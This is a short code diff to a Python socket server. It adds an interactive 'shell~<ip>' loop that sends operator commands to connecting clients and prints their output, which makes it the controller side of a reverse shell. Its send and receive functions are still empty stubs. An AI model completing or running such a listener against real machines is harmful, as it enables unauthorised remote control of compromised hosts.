@@ -10,6 +10,22 @@ print_horizontal_delimiter()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 interfaces = get_interfaces_ipv4_dict()
 
+def reliable_send(command):
+    pass
+
+def reliable_receive():
+    pass
+
+def communicate(ip):
+    while(True):
+        command = input("shell~%s" % str(ip))
+        reliable_send(command)
+        if command == "exit":
+            break
+        else:
+            result = reliable_receive()
+            print(result)
+
 interface = input("# Step 1: Specify network interface to use\n"
                      f"# all interfaces: {interfaces}\n"
                      "# ex. wlan0\n")
@@ -26,3 +42,5 @@ s.listen(MAX_SESSIONS)
 print("# Listening for incoming connections...")
 while(True):
     target, ip = s.accept()
+    print(f"[+] Started new communication with {ip}")
+    communicate(ip)
